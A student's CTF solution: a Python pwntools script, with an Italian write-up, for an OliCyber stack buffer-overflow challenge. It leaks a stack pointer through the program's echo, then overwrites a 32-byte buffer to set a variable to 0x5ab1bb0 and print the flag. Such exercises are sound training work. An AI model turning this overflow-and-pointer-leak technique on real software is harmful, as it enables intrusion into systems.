#Gregorio Maria Vallé 5^C Informatica 02/10/2023

#!/usr/bin/env python3

from pwn import *
import binascii

exe = ELF("./bigof_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("big-overflow.challs.olicyber.it", 34003)

    return r


def main():
    r = conn()

    r.sendafter(b"name?", b"a"*32)
    
    address = r.recvuntil(b"please: ").split()[2]

    print("indirizzo file: " + str(address[32:-3]))
    
    print("len: " + str(len(address[32:-3])))
    
    r.sendline(b"a"*32 + address[32:-3] + b"\x00"*(7-len(address[33:-3])) + p32(0x5ab1bb0))

    r.interactive()


if __name__ == "__main__":
    main()

'''
La challenge chiede di inserire una stringa, e la scrive in un buffer sullo stack. Subito dopo stampa la stessa stringa, e ne chiede un'altra con cui la sovrascrive.

Il numero di byte che il programma legge è maggiore della lunghezza del buffer, quindi si può sovrascrivere la memoria che sullo stack si trovo dopo il buffer.

Il programma poi confronta una variabile sullo stack con 0x5ab1bb0, e se corrispondesse, stamperebbe la flag.

Soluzione
Il buffer ha dimensione 32, e subito dopo sullo stack c'è un puntatore utilizzato, e dopo ancora la variabile di interesse.

Se il puntatore venisse sovrascritto con dati random, il programma andrebbe in crash qualora provasse a stampare la flag (il puntatore è il file di output dato in argomento a fprintf).

Dato che il programma fa un echo della stringa da noi inserita, possiamo arrivare in memoria fino all'inizio del puntatore per ottenerne il valore (edge case: se il puntatore contiene \x00 questo non funziona, ma succede raramante).

Una volta ottenuto il valore del puntatore si può riscrivere il buffer con: [32 byte random] + [puntatore ottenuto] + [0x5ab1bb0].
'''